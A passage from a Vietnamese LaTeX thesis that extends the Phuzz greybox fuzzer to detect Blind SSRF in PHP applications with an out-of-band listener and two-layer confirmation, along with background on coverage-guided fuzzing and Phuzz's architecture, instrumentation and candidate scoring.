dùng được truyền vào hàm shell như \texttt{shell\_exec()}, kẻ tấn công có thể chèn
lệnh \texttt{curl} hoặc \texttt{wget} để thực hiện kết nối mạng tùy ý. Đây là một
dạng SSRF gián tiếp qua tầng shell, cần bộ mutator và hook riêng biệt.

% ============================================================
\section{Khoảng trống Nghiên cứu và Hướng Giải quyết}
\label{sec:gap}
% ============================================================

\subsection{Xác định Khoảng trống}

Phân tích ở các phần trước xác định một khoảng trống cụ thể và rõ ràng trong công
nghệ kiểm thử bảo mật hiện tại: \textit{không tồn tại greybox fuzzer nào tích hợp
kênh tín hiệu OOB vào vòng lặp fuzzing để phát hiện Blind SSRF một cách tự động và
không có false positive}.

Khoảng trống này tồn tại do ba nguyên nhân có liên quan:

\begin{enumerate}
    \item \textbf{Giả định thiết kế}: Greybox fuzzer truyền thống được thiết kế với
    giả định rằng tín hiệu phản hồi đến từ hai kênh: HTTP response và code coverage.
    Cả hai kênh đều không phản ánh hành vi mạng ẩn của ứng dụng.
    \item \textbf{Khoảng cách công nghệ}: Kỹ thuật OOB tồn tại trong công cụ kiểm
    thử thủ công (Burp Collaborator) nhưng chưa được tích hợp vào vòng lặp fuzzing
    tự động theo cách có hệ thống, với cơ chế tương quan token đảm bảo chính xác
    trong môi trường song song.
    \item \textbf{Thách thức kỹ thuật}: Phát hiện Blind SSRF trong fuzzing tự động
    đặt ra bài toán không tầm thường --- cần tương quan nhân quả giữa hàng nghìn
    request gửi song song và các OOB callback không đồng bộ, đồng thời tránh false
    positive từ các kết nối mạng không liên quan.
\end{enumerate}

\subsection{Hướng Giải quyết Đề xuất}

Khóa luận này đề xuất lấp khoảng trống đó bằng cách mở rộng Phuzz~\cite{neef2024phuzz}
với ba thành phần mới được tích hợp theo cách không phá vỡ kiến trúc gốc:

\begin{enumerate}
    \item \textbf{Bộ đột biến SSRF chuyên biệt.} \texttt{SSRFMutator} sinh payload
    OOB bao phủ 21 biến thể (IP-based, DNS-based, hostname-based) theo phương pháp
    round-robin, đảm bảo đa dạng kỹ thuật bypass. \texttt{CmdInjectionSSRFMutator}
    thêm 10 biến thể command injection cho các endpoint có nguy cơ gọi lệnh shell.
    Thiết kế đa biến thể là cần thiết vì một số lỗ hổng chỉ phát hiện được qua đúng
    một biến thể: ví dụ CVE-2020-28975 (Canto plugin) chỉ phát hiện qua biến thể
    scheme-less, CVE-2021-32682 (elFinder) chỉ qua biến thể hostname-based.

    \item \textbf{Máy chủ OOB lắng nghe độc lập.} Container \texttt{phuzz-oob} chạy
    Flask HTTP/HTTPS listener (cổng 8000/8443) và dnsmasq với wildcard DNS
    (\texttt{*.oob}), nhận callback từ ứng dụng mục tiêu và ghi log nguyên tử vào
    shared-tmpfs. Thiết kế container độc lập cho phép tái sử dụng với bất kỳ ứng dụng
    mục tiêu nào mà không cần sửa đổi.

    \item \textbf{Module phát hiện hai tầng.} \texttt{SSRFVulnCheck} kết hợp tín hiệu
    in-band (PHP hook qua UOPZ ghi nhận lời gọi hàm mạng với OOB payload) và tín hiệu
    OOB (callback log từ OOB server) theo logic AND. Chỉ khi cả hai file bằng chứng
    cùng tồn tại mới xác nhận lỗ hổng, đảm bảo zero false positive.
\end{enumerate}

Hướng tiếp cận này giải quyết đồng thời cả ba nguyên nhân của khoảng trống: bổ sung
kênh tín hiệu thứ ba (OOB), tự động hóa hoàn toàn quá trình từ sinh payload đến xác
nhận lỗ hổng, và đảm bảo tương quan chính xác qua cơ chế token 8 ký tự gắn với từng
ứng viên.

% ============================================================
\section{Mục tiêu và Phạm vi Nghiên cứu}
\label{sec:objectives}
% ============================================================

\subsection{Mục tiêu}

Mục tiêu chính của khóa luận là thiết kế và cài đặt một hệ thống phát hiện Blind
SSRF hoàn toàn tự động trong môi trường greybox fuzzing PHP, tích hợp vào framework
Phuzz, với các tiêu chí đánh giá cụ thể:

\begin{itemize}
    \item \textbf{Tự động hóa hoàn toàn}: không yêu cầu can thiệp thủ công trong quá
    trình fuzzing; hệ thống tự sinh payload, thu tín hiệu từ cả hai kênh, tương quan
    OOB callback với request, xác nhận lỗ hổng và ghi report có cấu trúc.
    \item \textbf{Không có false positive}: mỗi lỗ hổng chỉ được báo cáo khi có bằng
    chứng mạng thực tế từ cả hai tầng tín hiệu (logic AND).
    \item \textbf{Tương thích và không xâm lấn}: tích hợp hoàn toàn dưới dạng module
    bổ sung, giữ nguyên toàn bộ chức năng phát hiện lỗ hổng gốc và cấu trúc code của
    Phuzz.
    \item \textbf{Bao phủ bề mặt tấn công}: payload bao gồm 21 biến thể SSRF và 10
    biến thể command injection SSRF; PHP hook bao phủ 23 hàm trên 5 nhóm chức năng.
    \item \textbf{Kiểm chứng thực nghiệm}: đánh giá trên cả ứng dụng lab và CVE thực
    tế từ hệ sinh thái WordPress plugin.
\end{itemize}

\subsection{Phạm vi}

\textbf{Trong phạm vi:}
\begin{itemize}
    \item Ứng dụng PHP (phiên bản 7.4 và 8.x) chạy trong môi trường Docker, bao gồm
    cả ứng dụng WordPress với plugin bên thứ ba.
    \item Lỗ hổng SSRF và Blind SSRF được kích hoạt qua tham số HTTP (query string,
    POST form data, JSON body, HTTP header tùy chỉnh).
    \item Phát hiện SSRF thông qua các hàm mạng PHP: \texttt{file\_get\_contents},
    \texttt{curl\_exec}, \texttt{fsockopen}, \texttt{getimagesize}, các hàm WordPress
    HTTP API, và các hàm shell execution (qua command injection chèn lệnh curl/wget).
    \item Môi trường kiểm thử cục bộ (Docker network 172.20.0.0/24); OOB server
    trong cùng mạng nội bộ với địa chỉ IP tĩnh 172.20.0.10.
\end{itemize}

\textbf{Ngoài phạm vi:}
\begin{itemize}
    \item Các ngôn ngữ server-side khác (Python, Node.js, Java, Ruby). Khóa luận
    thảo luận khả năng mở rộng nhưng không cài đặt.
    \item Stored SSRF --- trong đó payload được lưu vào database và kích hoạt SSRF ở
    một request hoàn toàn khác sau đó. Khóa luận phân tích thách thức và đề xuất
    hướng giải quyết ở Chương~5 nhưng không cài đặt đầy đủ.
    \item Khai thác lỗ hổng (exploitation) sau khi phát hiện; khóa luận chỉ tập
    trung vào giai đoạn phát hiện và xác nhận với bằng chứng mạng.
    \item Phát hiện phân tán trên nhiều máy vật lý hoặc môi trường cloud production
    với tường lửa egress nghiêm ngặt.
\end{itemize}

% ============================================================
\section{Đóng góp của Khóa luận}
\label{sec:contributions}
% ============================================================

Khóa luận có ba đóng góp kỹ thuật chính:

\begin{enumerate}
    \item \textbf{Bộ đột biến SSRF chuyên biệt.} \texttt{SSRFMutator} sinh
    payload OOB bao phủ 21 biến thể (IP-based, DNS-based, hostname-based)
    theo phương pháp round-robin, bao phủ các kỹ thuật bypass phổ biến nhất.
    \texttt{CmdInjectionSSRFMutator} bổ sung 10 biến thể command injection
    cho các endpoint có nguy cơ thực thi lệnh shell. Đây là bộ đột biến SSRF
    đầu tiên được tích hợp vào vòng lặp greybox fuzzing tự động cho ứng
    dụng PHP.

    \item \textbf{Cơ sở hạ tầng OOB lắng nghe tích hợp.} Container
    \texttt{phuzz-oob} cung cấp HTTP/HTTPS listener (cổng 8000/8443) và
    dnsmasq với wildcard DNS (\texttt{*.oob}), nhận callback từ ứng dụng
    mục tiêu và ghi log nguyên tử vào shared-tmpfs. Thiết kế container độc
    lập cho phép tái sử dụng với bất kỳ ứng dụng mục tiêu nào mà không cần
    sửa đổi.

    \item \textbf{Cơ chế phát hiện Blind SSRF hai tầng không có false positive.}
    \texttt{SSRFVulnCheck} kết hợp tín hiệu in-band (PHP hook qua UOPZ ghi
    nhận lời gọi hàm mạng với OOB payload) và tín hiệu OOB (callback log
    từ OOB server) theo logic AND. Chỉ khi cả hai bằng chứng cùng tồn tại
    mới xác nhận lỗ hổng, đảm bảo zero false positive ngay trong môi trường
    fuzzing song song.
\end{enumerate}

Ba đóng góp trên được tích hợp hoàn toàn theo mô hình plugin không xâm lấn
vào Phuzz~\cite{neef2024phuzz}, giữ nguyên toàn bộ chức năng phát hiện lỗ
hổng gốc, đồng thời mở rộng khả năng phát hiện lên lớp lỗ hổng Blind SSRF
vốn nằm ngoài tầm quan sát của mọi greybox fuzzer hiện tại.

% ============================================================
\section{Cấu trúc Khóa luận}
\label{sec:structure}
% ============================================================

Phần còn lại của khóa luận được tổ chức như sau:

\textbf{Chương~2 --- Cơ sở Lý thuyết} trình bày nền tảng lý thuyết cần thiết: tổng
quan chi tiết về kỹ thuật greybox fuzzing, energy-based seed scheduling và coverage
guidance; kiến trúc và cơ chế hoạt động đầy đủ của framework Phuzz bao gồm cơ chế
instrumentation và VulnChecker; cơ chế phân tích động, hook hàm PHP qua extension
UOPZ; và nhận xét về bài toán cần giải quyết từ góc độ khoảng trống kỹ thuật.

\textbf{Chương~3 --- Thiết kế và Cài đặt Hệ thống} mở đầu bằng phân tích toàn diện
lỗ hổng SSRF (định nghĩa, phân loại, tác động, kỹ thuật bypass) và kỹ thuật OOB
(cơ chế tương quan token, so sánh giao thức), tiếp theo là mô tả chi tiết kiến trúc
bốn container Docker trên mạng phuzz-net 172.20.0.0/24; cài đặt hook PHP với 23 hook
trên 5 nhóm hàm; OOB server (Flask + dnsmasq, ghi log nguyên tử); bộ đột biến SSRF
với 21 biến thể và 10 biến thể command injection; cơ chế phát hiện hai tầng với AND
logic; và cách các thành phần tích hợp vào vòng lặp fuzz chính theo mô hình plugin
không xâm lấn.

\textbf{Chương~4 --- Thực nghiệm và Đánh giá} trình bày môi trường thực nghiệm, thiết
kế thực nghiệm trên 14 mục tiêu (6 ứng dụng lab và 8 CVE thực tế từ hệ sinh thái
WordPress và PHP plugin), kết quả phát hiện chi tiết cho từng mục tiêu, phân tích các
trường hợp đặc biệt (biến thể bypass scheme-less, sink getimagesize, stream wrapper
cho include/require), và so sánh với Phuzz gốc chưa tích hợp OOB.

\textbf{Chương~5 --- Kết luận và Hướng Phát triển} tổng kết các đóng góp chính của
khóa luận, phân tích trung thực các hạn chế còn tồn tại (phạm vi ngôn ngữ PHP, stored
SSRF, quy mô thực nghiệm, phụ thuộc kết nối mạng nội bộ), và đề xuất các hướng mở
rộng tiềm năng (đa ngôn ngữ, stored SSRF qua deferred lookup, XXE/SQLi OOB, tự động
tạo PoC, tích hợp CI/CD pipeline).

\chapter{Phát hiện lỗ hổng ứng dụng web bằng phương pháp Greybox fuzzing}


Chương này trình bày các kiến thức nền tảng cần thiết để hiểu rõ bài toán
và đánh giá giải pháp đề xuất trong khóa luận.
Phần~\ref{sec:greybox-fuzzing} giới thiệu kỹ thuật greybox fuzzing, lịch sử
phát triển và những thách thức đặc thù khi áp dụng lên ứng dụng web PHP.
Phần~\ref{sec:phuzz} mô tả kiến trúc, cơ chế hoạt động và công thức đánh giá
ứng viên của framework Phuzz --- nền tảng mà khóa luận này mở rộng.
Phần~\ref{sec:hooking} mô tả kiến trúc runtime của PHP, cơ chế hook hàm qua
UOPZ và vai trò của phân tích động --- thành phần kỹ thuật cốt lõi để xây
dựng kênh tín hiệu bổ sung cho SSRF.
Phần~\ref{sec:problem-statement} nhận xét về khoảng trống kỹ thuật và phát
biểu bài toán cần giải quyết.

% ============================================================
\section{Greybox Fuzzing}
\label{sec:greybox-fuzzing}
% ============================================================

\subsection{Lịch sử và Bối cảnh Fuzz Testing}

Fuzz testing (hay fuzzing) là kỹ thuật kiểm thử phần mềm tự động được đề
xuất lần đầu bởi Barton Miller vào năm 1988 tại Đại học Wisconsin--Madison,
khi ông nhận thấy rằng các chương trình Unix bị crash khi nhận đầu vào ngẫu
nhiên từ một đường truyền có nhiễu~\cite{miller1990empirical, li2018fuzzing}. Từ xuất phát điểm
giản dị đó, fuzzing đã phát triển thành một trong những kỹ thuật kiểm thử
bảo mật hiệu quả và được nghiên cứu rộng rãi nhất.

Giai đoạn đầu (1988--2010) chứng kiến sự phát triển của các
\emph{blackbox fuzzer} thế hệ đầu: sinh chuỗi ngẫu nhiên hoặc dựa trên
ngữ pháp, không có phản hồi từ chương trình. Mặc dù đơn giản, chúng phát
hiện được nhiều lỗi thực tế trong phần mềm thương mại. Giai đoạn tiếp theo
(2010--nay) đánh dấu bước ngoặt khi American Fuzzy Lop (AFL) của Michal
Zalewski~\cite{zalewski2014afl} phổ biến hóa \emph{coverage-guided fuzzing}:
sử dụng thông tin độ phủ mã thực thi như tín hiệu phản hồi để hướng dẫn
quá trình đột biến. AFL++ \cite{fioraldi2020afl} tiếp tục mở rộng và tổng
hợp nhiều cải tiến nghiên cứu. Song song, Google phát triển
libFuzzer~(in-process) và honggfuzz~\cite{google2023honggfuzz} cho các
kịch bản khác nhau.

Khảo sát của Manes và cộng sự~\cite{manes2021art} phân tích hơn 200 công
trình nghiên cứu về fuzzing và đề xuất một khung thuật ngữ thống nhất, định
nghĩa fuzzing là \textit{``quá trình thực thi PUT (Program Under Test) với
các đầu vào được tạo ra tự động để phát hiện lỗi và/hoặc lỗ hổng bảo mật''}.
Zhu và cộng sự~\cite{zhu2022fuzzing} tổng hợp thêm về roadmap tương lai,
nhấn mạnh sự cần thiết mở rộng fuzzing sang các domain phi truyền thống như
ứng dụng web, hệ thống nhúng và giao thức mạng.

\subsection{Phân loại Fuzzer theo Mức độ Thông tin}

Dựa trên mức độ truy cập thông tin nội bộ của chương trình mục tiêu, fuzzer
được phân thành ba nhóm~\cite{godefroid2007random, li2018fuzzing, zhu2022fuzzing}.

\textbf{Blackbox fuzzer} hoàn toàn không có thông tin về cấu trúc bên trong
ứng dụng. Fuzzer chỉ quan sát được đầu ra bên ngoài (HTTP response, mã trạng
thái, thời gian phản hồi) để đánh giá test case. Ưu điểm là dễ triển khai và
không cần mã nguồn; nhược điểm là khả năng khám phá code path rất hạn chế
trong các ứng dụng có logic phức tạp. Nghiên cứu của Doupé và cộng
sự~\cite{doupe2010johnny} chỉ ra rằng blackbox fuzzer bỏ sót đáng kể các lỗ
hổng trong ứng dụng web, đặc biệt là các lỗ hổng đòi hỏi điều hướng qua
nhiều bước tương tác.

\textbf{Whitebox fuzzer} có đầy đủ thông tin về mã nguồn và cấu trúc chương
trình, cho phép áp dụng các kỹ thuật phân tích tĩnh nặng như thực thi tượng
trưng (symbolic execution)~\cite{godefroid2008automated} hay phân tích vết
lan truyền dữ liệu (taint analysis)~\cite{ganesh2009taint}. Thực thi tượng
trưng biểu diễn các biến đầu vào bằng ký hiệu toán học, xây dựng ràng buộc
từ mỗi nhánh điều kiện, rồi dùng SMT solver để sinh giá trị cụ thể cho phép
chương trình đi theo từng nhánh. Độ chính xác lý thuyết cao là ưu điểm,
nhưng chi phí tính toán lớn (state explosion problem), khó xử lý các thư viện
bên ngoài và mã nguồn động là hạn chế chính khiến kỹ thuật này khó mở rộng
cho ứng dụng web thực tế.

\textbf{Greybox fuzzer} là chiến lược trung gian, đạt được sự đánh đổi tốt
giữa chi phí và hiệu quả: fuzzer thu thập thông tin thực thi (thường là độ
phủ mã) trong khi chạy mà không cần phân tích tĩnh toàn bộ mã nguồn. Thông
tin phủ này trở thành tín hiệu phản hồi để ưu tiên và đột biến các test case
có khả năng khám phá code path mới. AFL++~\cite{fioraldi2020afl} là hiện thực
phổ biến nhất cho ứng dụng nhị phân và là nguồn cảm hứng thiết kế của Phuzz.

\subsection{Coverage-Guided Fuzzing và Vòng lặp Fuzz}
\label{subsec:cgf-loop}

Coverage-guided fuzzing (CGF) là hướng tiếp cận greybox phổ biến
nhất~\cite{li2018fuzzing, manes2021art}. Một test case được coi là
\emph{thú vị} nếu nó kích hoạt ít nhất một code path mới chưa từng được
quan sát trong tập ứng viên hiện tại. Những test case như vậy được giữ lại
trong tập ứng viên (corpus) và ưu tiên đột biến ở các vòng lặp tiếp theo.

Trong fuzzing nhị phân, coverage thường được đo ở đơn vị \emph{edge}
(cạnh trong đồ thị luồng điều khiển, tức là cặp basic block \((A, B)\) nơi
điều khiển chuyển từ $A$ sang $B$). AFL đại diện cho tập edge đã thấy bằng
một \emph{bitmap} $B$ gồm 65536 byte, trong đó byte $B[A \oplus B]$ đếm số
lần edge $(A, B)$ được thực thi trong một test case. Một test case mới được
coi là thú vị nếu bitmap của nó chứa ít nhất một edge chưa có trong bitmap
tổng hợp từ tất cả ứng viên trước đó.

Vòng lặp coverage-guided fuzzing bao gồm sáu bước chính~\cite{manes2021art}:
\begin{enumerate}
    \item \textbf{Khởi tạo}: Nạp tập seed ban đầu vào corpus; thực thi từng
    seed để thiết lập coverage nền $B_0$.
    \item \textbf{Chọn ứng viên}: Áp dụng chiến lược lên lịch seed để chọn
    ứng viên $s$ tiếp theo từ corpus.
    \item \textbf{Phân bổ năng lượng}: Tính số lần đột biến $E(s)$ sẽ dành
    cho $s$ dựa theo chiến lược năng lượng.
    \item \textbf{Đột biến}: Sinh $E(s)$ test case mới $t_1, \ldots, t_{E(s)}$
    từ $s$ bằng các phép đột biến (bit flip, byte insertion, boundary values,\ldots).
    \item \textbf{Thực thi và Đánh giá}: Với mỗi $t_i$: thực thi PUT, thu
    thập bitmap $B_i$; nếu $B_i$ chứa edge mới so với bitmap tổng hợp thì
    thêm $t_i$ vào corpus; nếu $t_i$ kích hoạt hành vi bất thường (crash, lỗi
    bảo mật) thì ghi nhận phát hiện.
    \item Lặp lại từ bước 2 đến khi hết ngân sách thời gian.
\end{enumerate}

Trong fuzzing nhị phân (AFL, AFL++~\cite{fioraldi2020afl, zalewski2014afl},
honggfuzz~\cite{google2023honggfuzz}), coverage được thu thập bằng cách
instrument các basic block tại thời điểm biên dịch (\emph{compile-time
instrumentation}) và chia sẻ bitmap qua vùng nhớ dùng chung (shared memory)
giữa fuzzer và tiến trình PUT.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Flowchart vòng lặp Coverage-Guided Fuzzing (6 bước, hình tròn/vòng khép kín).
    % Bước 1 (Khởi tạo): hình chữ nhật "Seed pool ban đầu" → thực thi → coverage nền B0.
    % Bước 2 (Chọn ứng viên): hình thoi "Corpus rỗng?" → nếu không: chọn s có score cao nhất.
    % Bước 3 (Phân bổ năng lượng): hình chữ nhật "Tính E(s) theo power schedule".
    % Bước 4 (Đột biến): hình chữ nhật "Sinh E(s) đột biến t1...tE".
    % Bước 5 (Thực thi): hình chữ nhật "Gửi ti đến PUT, thu bitmap Bi".
    % Bước 6 (Đánh giá): hình thoi "Bi có edge mới?" → có: thêm ti vào corpus (quay lại bước 2);
    %   không: hình thoi "ti kích hoạt lỗ hổng?" → có: ghi nhận; không: tiếp tục.
    % Mũi tên vòng lặp quay lại bước 2.
    \includegraphics[width=0.80\textwidth]{figures/fig-cgf-loop}
    \caption{Vòng lặp Coverage-Guided Fuzzing.}
    \label{fig:cgf-loop}
\end{figure}

\subsection{Lên lịch Seed và Phân bổ Năng lượng}
\label{subsec:energy-scheduling}

Chiến lược lên lịch seed (\emph{seed scheduling}) và phân bổ năng lượng
(\emph{energy assignment}) có ảnh hưởng lớn đến tốc độ khám phá code path
mới, nhưng thường bị bỏ qua trong các thiết kế fuzzer đơn giản.

\textbf{AFL gốc} dùng chiến lược round-robin đơn giản: mỗi seed được phân
bổ số lần đột biến bằng nhau, không phân biệt tầm quan trọng. Điều này dẫn
đến lãng phí ngân sách fuzz cho các seed ở vùng code đã được khai thác kỹ.

\textbf{AFLFast}~\cite{bohme2016coverage} đưa ra khái niệm \emph{power schedule}:
mỗi seed $s$ nhận năng lượng $E(s)$ tỷ lệ với \emph{mức độ ít được khám
phá} của vùng code mà $s$ thực thi. Trực giác là: seed thực thi các code path
hiếm (ít test case kích hoạt) nên nhận nhiều năng lượng hơn để fuzzer tập
trung khai thác vùng đó. AFLFast định nghĩa nhiều power schedule khác nhau
(FAST, COE, QUAD, LIN, EXPLOIT, EXPLORE), mỗi cái ưu tiên tiêu chí khác nhau.

Trong Phuzz~\cite{neef2024phuzz}, chiến lược tương tự được áp dụng dựa trên
số đường đi mới và dòng code mới mà mỗi ứng viên khai phá được trong quá
khứ (xem chi tiết trong Phần~\ref{subsec:scoring}).

\subsection{Thách thức khi Áp dụng lên Ứng dụng Web PHP}

Khi chuyển kỹ thuật greybox fuzzing từ ứng dụng nhị phân sang ứng dụng web
PHP, nhiều thách thức đặc thù xuất hiện~\cite{neef2024phuzz,
vanrooij2021webfuzz}.

\textbf{Thách thức về instrumentation.} PHP là ngôn ngữ thông dịch,
không biên dịch trước, nên không thể instrument ở tầng nhị phân như AFL.
Giữa fuzzer và ứng dụng PHP luôn có web server trung gian (Apache, nginx)
tạo lớp gián tiếp. Cơ chế shared memory của AFL không áp dụng được vì các
thành phần chạy trên các container riêng biệt. Phuzz giải quyết bằng cách
dùng PHP extension (Xdebug/PCOV) ghi coverage ra file tmpfs, và fuzzer đọc
lại file sau mỗi request.

\textbf{Thách thức về phát hiện lỗ hổng.} Trong fuzzing nhị phân, crash
của ứng dụng là chỉ số rõ ràng cho hành vi bất thường. Với PHP, interpreter
không crash --- thay vào đó emit exception hoặc error message, và web server
trả về trang lỗi với mã HTTP 5xx. Hơn nữa, ứng dụng có thể bắt và xử lý
lỗi một cách graceful (try/catch), che giấu hoàn toàn tín hiệu. Đặc biệt,
các lớp lỗ hổng như Blind SSRF không để lại bất kỳ dấu vết nào trong HTTP
response --- thách thức này là trọng tâm của khóa luận.

\textbf{Thách thức về sinh test case.} HTTP request có cấu trúc nghiêm ngặt
(method, headers, body encoding); đột biến tùy tiện ở mức byte tạo ra request
không hợp lệ bị web server từ chối trước khi đến PHP. Fuzzer phải thực hiện
đột biến có kiểm soát --- chỉ thay đổi các tham số cụ thể (query string,
POST body, cookie, header) mà không phá vỡ cấu trúc HTTP.

\textbf{Thách thức về trạng thái ứng dụng.} Ứng dụng web thường có trạng
thái phức tạp: session cookie hết hạn, CSRF token thay đổi theo từng request,
database bị ô nhiễm sau các thao tác ghi. Fuzzer cần cơ chế đăng nhập lại tự
động, quản lý session và trong nhiều trường hợp cần reset cơ sở dữ liệu về
trạng thái sạch giữa các lần fuzz để đảm bảo tính tái hiện.

\textbf{Thách thức về môi trường đa tiến trình.} PHP web applications thường
dùng cơ sở dữ liệu, cache và hàng đợi bất đồng bộ. Khi nhiều instance fuzzer
chạy song song, các request có thể can thiệp lẫn nhau qua trạng thái chia
sẻ trong database, dẫn đến hành vi không tái hiện được.

% ============================================================
\section{Framework Phuzz}
\label{sec:phuzz}
% ============================================================

Phuzz~\cite{neef2024phuzz} là framework coverage-guided fuzzing modular,
được thiết kế đặc thù cho ứng dụng web PHP. Được trình bày tại hội nghị
AsiaCCS 2024, Phuzz giải quyết các thách thức nêu trong
Phần~\ref{sec:greybox-fuzzing} thông qua kiến trúc container hóa và cơ chế
instrumentation trong suốt. Đây là nền tảng mà khóa luận này mở rộng để
thêm khả năng phát hiện SSRF.

\subsection{Kiến trúc Tổng thể}

Toàn bộ Phuzz được triển khai trong môi trường Docker~\cite{docker2023}, cho
phép khởi chạy và tái tạo môi trường fuzz một cách nhất quán trên mọi máy.
Hệ thống bao gồm các thành phần chính:

\textbf{Browser và Crawler.} Quá trình bắt đầu bằng việc thu thập các
endpoint cần fuzz. Phuzz hỗ trợ hai phương thức: (1) tự động crawl bằng
headless Chromium qua thư viện Playwright~\cite{microsoft2024playwright},
ghi lại tất cả HTTP request như một HAR file; (2) thủ công bằng cách xuất
HAR file từ DevTools của trình duyệt sau khi tương tác với ứng dụng. Phương
thức thủ công cho phép kiểm soát chính xác phạm vi fuzz, đặc biệt hữu ích
với các API endpoint yêu cầu xác thực phức tạp hoặc multi-step workflow.

\textbf{HARgen và Composegen.} HARgen chuyển đổi HAR file thành file cấu
hình fuzzer ở định dạng JSON. Mỗi tham số (query, body, cookie, header) được
đánh dấu \texttt{fixed} (giữ nguyên, dùng cho session token) hoặc
\texttt{fuzz} (sẽ bị đột biến). Composegen sinh file
\texttt{docker-compose.yml} từ tập cấu hình, cho phép khởi chạy toàn bộ
môi trường chỉ bằng một lệnh. Định dạng cấu hình JSON điển hình:

\begin{verbatim}
{
  "target": "http://web/wp-admin/admin-ajax.php",
  "methods": ["POST"],
  "cookies": {
    "data":  [{"name": "wordpress_logged_in_...",
               "seeds": ["<session>"]}],
    "fixed": [".*"],
    "login": ["wordpress_logged_in_.*"]
  },
  "body_params": {
    "data":   [{"name": "url", "seeds": ["http://example.com"]}],
    "fuzz":   ["url"],
    "weight": 1.0
  }
}
\end{verbatim}

\textbf{Fuzzer.} Thành phần trung tâm, thực hiện vòng lặp fuzz (chi tiết tại
Phần~\ref{subsec:cgf-loop}): đọc cấu hình endpoint, khởi tạo tập ứng viên
ban đầu, chọn ứng viên điểm cao nhất, tính năng lượng, sinh đột biến, gửi
request có header \texttt{X-Fuzzer-Covid: <ID>}, đọc coverage, chạy
VulnChecker và cập nhật điểm ứng viên. Nhiều instance fuzzer có thể chạy
song song, đồng bộ hóa tập ứng viên đã đánh giá qua shared volume để tránh
thực thi trùng lặp.

\textbf{Shared Volume (tmpfs).} Phuzz dùng Docker tmpfs volume làm kênh trao
đổi thông tin giữa các container. PHP-side instrumentation ghi coverage report
vào \texttt{/shared-tmpfs/coverage-reports/<ID>.json}; fuzzer đọc lại để đánh
giá ứng viên. Cơ chế này giải quyết vấn đề thiếu shared memory xuyên container.
Ngoài coverage, tmpfs còn lưu các loại báo cáo khác: hook trigger, OOB log và
kết quả phát hiện lỗ hổng.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Sơ đồ kiến trúc Phuzz với luồng dữ liệu.
    % Phần trên: Kiểm thử viên → Playwright Browser → HAR file
    %            → HARgen → fuzzer-config.json → Composegen → docker-compose.yml.
    % Docker environment (hình chữ nhật bao quanh 3 container):
    %   - phuzz-fuzzer: "Fuzzer (Python)" — vòng lặp fuzz, VulnChecker, Candidate Pool.
    %   - phuzz-web: "Web Container (PHP 8 + Apache + PCOV)" — ứng dụng mục tiêu,
    %                 auto_prepend_file instrumentation.
    %   - phuzz-db: "Database (MySQL 8)".
    % Mũi tên giữa các container:
    %   fuzzer → [HTTP request + X-Fuzzer-Covid header] → web.
    %   web → [coverage JSON] → shared-tmpfs/coverage-reports/.
    %   fuzzer ← [đọc coverage] ← shared-tmpfs.
    %   web ↔ db (SQL queries).
    % Phần dưới: shared-tmpfs (hình trụ) kết nối fuzzer ↔ web.
    \includegraphics[width=0.88\textwidth]{figures/fig-phuzz-arch}
    \caption{Kiến trúc hệ thống Phuzz.}
    \label{fig:phuzz-arch}
\end{figure}

\subsection{Cơ chế Instrumentation}
\label{subsec:instrumentation}

\textbf{Thu thập coverage.} Phuzz hỗ trợ hai PHP extension:
Xdebug~\cite{rethans2002xdebug} và PCOV~\cite{watkins2023pcov}. Điểm then
chốt là instrumentation hoàn toàn \emph{trong suốt} với ứng dụng mục tiêu
--- không cần chỉnh sửa mã nguồn PHP, cấu hình web server, hay cơ sở dữ
liệu. Phuzz dùng \texttt{auto\_prepend\_file} (cấu hình PHP) để inject
instrumentation code trước khi PHP chạy bất kỳ code ứng dụng nào; và đăng
ký \texttt{register\_shutdown\_function} để đảm bảo coverage luôn được lưu
kể cả khi ứng dụng gọi \texttt{exit()} hoặc bị terminate bởi bộ giới hạn
thời gian.

Mỗi request mang header bổ sung \texttt{X-Fuzzer-Covid: <ID>} (định danh
dạng \texttt{<timestamp>-<UUIDv4>}). PHP-side code đọc header qua
\texttt{\$\_SERVER['HTTP\_X\_FUZZER\_COVID']}, bật coverage collection ngay
đầu request, và lưu report ra \texttt{/shared-tmpfs/coverage-reports/<ID>.json}
khi shutdown. File JSON chứa danh sách file PHP và line number đã được thực thi,
cùng thông tin về lời gọi hàm mà các hook đã ghi lại.

\textbf{So sánh Xdebug và PCOV.}

\begin{itemize}
    \item \textbf{Xdebug}~\cite{rethans2002xdebug}: Extension đa năng (debug,
    profile, trace, coverage); hỗ trợ branch coverage và path coverage theo
    dõi từng nhánh điều kiện. Overhead lớn hơn PCOV nhưng thông tin phong
    phú hơn.
    \item \textbf{PCOV}~\cite{watkins2023pcov}: Extension chuyên dụng cho
    line coverage; overhead thấp hơn đáng kể. Đây là lựa chọn mặc định của
    Phuzz để tối ưu throughput.
\end{itemize}

\textbf{Function hooking với UOPZ.} UOPZ (User Operations for
Zend)~\cite{phpgroup2023uopz} là PHP extension cho phép thao tác hàm ở tầng
interpreter. Phuzz dùng UOPZ để bọc (wrap) các hàm PHP nguy hiểm nhằm bắt
lời gọi hàm, ghi lại đối số và exception:

\begin{verbatim}
uopz_set_return('mysqli_query', function($conn, $query) {
    $result = mysqli_query($conn, $query);
    if ($result === false) {
        $err = mysqli_error($conn);
        phuzz_log_error('sqli', ['query' => $query,
                                 'error' => $err]);
    }
    return $result;
}, true);
\end{verbatim}

Nhờ đó Phuzz có thể bắt lời gọi hàm cùng đối số để xác nhận input từ
attacker đã lan truyền tới điểm nguy hiểm; bắt exception/error do input
không hợp lệ gây ra; và vô hiệu hóa các cơ chế xác thực/phân quyền để
fuzz các code path thông thường không thể tiếp cận.

\subsection{Công thức Đánh giá Ứng viên}
\label{subsec:scoring}

Mỗi ứng viên $c$ trong corpus được gán điểm số để quyết định thứ tự ưu tiên.
Phuzz dùng \texttt{DefaultScoringFormula}, kết hợp hai thành phần:

\begin{itemize}
    \item \textbf{$\Delta\text{paths}$}: Số code path (cặp dòng code liên tiếp
    trong luồng thực thi) mà $c$ khám phá \emph{lần đầu tiên} so với toàn bộ
    corpus hiện tại. Đây là thước đo chính về mức độ ``thú vị'' của $c$.
    \item \textbf{$\Delta\text{lines}$}: Số dòng code mới mà $c$ khám phá, bổ
    trợ cho $\Delta\text{paths}$ trong trường hợp ứng viên cover nhiều dòng
    mới nhưng ít path mới.
\end{itemize}

Điểm tổng hợp được tính theo:
\[
    \text{score}(c) = \alpha \cdot \Delta\text{paths}(c)
                    + \beta  \cdot \Delta\text{lines}(c)
\]
